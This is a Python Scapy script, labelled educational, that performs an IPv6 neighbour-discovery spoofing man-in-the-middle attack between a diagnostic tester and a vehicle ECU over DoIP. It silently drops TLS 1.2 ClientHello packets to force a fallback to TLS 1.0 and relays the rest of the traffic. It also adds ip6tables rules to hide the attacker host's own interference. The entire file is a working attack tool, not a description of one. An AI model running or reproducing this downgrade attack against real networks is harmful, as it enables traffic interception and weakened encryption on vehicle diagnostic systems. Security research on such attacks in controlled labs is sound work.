#!/usr/bin/env python3
"""
Educational TLS 1.2 → TLS 1.0 downgrade (IPv6 DoIP)

TLS 1.2 ClientHello → DROPPED
TLS 1.0 ClientHello → ALLOWED
"""

from scapy.all import *
import subprocess
import threading
import signal
import sys
import time

# ===================== CONFIG =====================
IFACE = "vatk"
PORT  = 3496

TESTER_IP = "fd00::40"
ECU_IP    = "fd00::10"

ATTACKER_MAC = get_if_hwaddr(IFACE)
TESTER_MAC   = getmacbyip6(TESTER_IP)
ECU_MAC      = getmacbyip6(ECU_IP)

TLS_DOWNGRADE_DONE = False

print(f"[*] Attacker MAC : {ATTACKER_MAC}")
print(f"[*] Tester MAC   : {TESTER_MAC}")
print(f"[*] ECU MAC      : {ECU_MAC}")

# ===================== IPTABLES =====================
def block_kernel_forward():
    print("[*] Blocking kernel and local TCP interference")
    # Block forwarding
    subprocess.run(["ip6tables", "-I", "FORWARD", "-p", "tcp", "--dport", str(PORT), "-j", "DROP"])
    subprocess.run(["ip6tables", "-I", "FORWARD", "-p", "tcp", "--sport", str(PORT), "-j", "DROP"])
    # Block local OUTPUT (prevents the attacker's own OS from sending RST)
    subprocess.run(["ip6tables", "-I", "OUTPUT", "-p", "tcp", "--sport", str(PORT), "-j", "DROP"])

def restore_kernel_forward():
    print("[*] Restoring kernel forwarding")
    subprocess.run([
        "ip6tables", "-D", "FORWARD",
        "-p", "tcp", "--dport", str(PORT), "-j", "DROP"
    ])
    subprocess.run([
        "ip6tables", "-D", "FORWARD",
        "-p", "tcp", "--sport", str(PORT), "-j", "DROP"
    ])

def cleanup(sig, frame):
    restore_kernel_forward()
    print("[*] Clean exit")
    sys.exit(0)

signal.signal(signal.SIGINT, cleanup)
signal.signal(signal.SIGTERM, cleanup)

block_kernel_forward()

# ===================== TLS PARSER =====================
def clienthello_version(payload: bytes):
    """
    Returns legacy_version (bytes) if ClientHello, else None
    """
    if len(payload) < 11:
        return None
    if payload[0] != 0x16:   # TLS record
        return None
    if payload[5] != 0x01:   # ClientHello
        return None
    return payload[9:11]

# ===================== NDP SPOOF =====================
def ndp_spoof():
    while True:
        sendp(
            Ether(dst=TESTER_MAC, src=ATTACKER_MAC) /
            IPv6(src=ECU_IP, dst=TESTER_IP) /
            ICMPv6ND_NA(tgt=ECU_IP, R=0, S=1, O=1) /
            ICMPv6NDOptDstLLAddr(lladdr=ATTACKER_MAC),
            iface=IFACE, verbose=0
        )

        sendp(
            Ether(dst=ECU_MAC, src=ATTACKER_MAC) /
            IPv6(src=TESTER_IP, dst=ECU_IP) /
            ICMPv6ND_NA(tgt=TESTER_IP, R=0, S=1, O=1) /
            ICMPv6NDOptDstLLAddr(lladdr=ATTACKER_MAC),
            iface=IFACE, verbose=0
        )
        time.sleep(1.5)

threading.Thread(target=ndp_spoof, daemon=True).start()

# ===================== MITM =====================
def mitm(pkt):
    global TLS_DOWNGRADE_DONE

    if not (IPv6 in pkt and TCP in pkt):
        return

    ip = pkt[IPv6]
    tcp = pkt[TCP]
    payload = bytes(pkt[Raw]) if Raw in pkt else b""

    # --- THE ATTACK LOGIC ---
    if ip.src == TESTER_IP and payload:
        # Check for TLS Record (0x16) and ClientHello (0x01)
        if payload[0] == 0x16 and payload[5] == 0x01:
            # Check version at bytes 9:11 or 11:13 depending on record type
            # \x03\x03 is TLS 1.2
            if b"\x03\x03" in payload[:15] and not TLS_DOWNGRADE_DONE:
                print(f"[ATTACK] Dropping TLS 1.2 ClientHello from {ip.src}")
                return # PACKET IS ERASED - Tester will eventually timeout
            
            if b"\x03\x01" in payload[:15]:
                print("[SUCCESS] TLS 1.0 Fallback detected. Forwarding to ECU...")
                TLS_DOWNGRADE_DONE = True

    # --- THE FORWARDING LOGIC (Must be perfect) ---
    dst_mac = ECU_MAC if ip.dst == ECU_IP else TESTER_MAC

    # Rebuild from scratch to ensure no hidden Scapy headers remain
    fwd = Ether(src=ATTACKER_MAC, dst=dst_mac) / \
          IPv6(src=ip.src, dst=ip.dst) / \
          TCP(sport=tcp.sport, dport=tcp.dport, seq=tcp.seq, ack=tcp.ack, 
              flags=tcp.flags, window=tcp.window, options=tcp.options)
    
    if payload:
        fwd /= Raw(load=payload)

    # Force recalculation
    del fwd[IPv6].plen
    del fwd[TCP].chksum
    
    sendp(fwd, iface=IFACE, verbose=0)

print("[*] TLS 1.2 blocked — TLS 1.0 allowed")
sniff(
    iface=IFACE,
    filter=f"ip6 and tcp port {PORT} and not ether src {ATTACKER_MAC}",
    prn=mitm,
    store=0
)
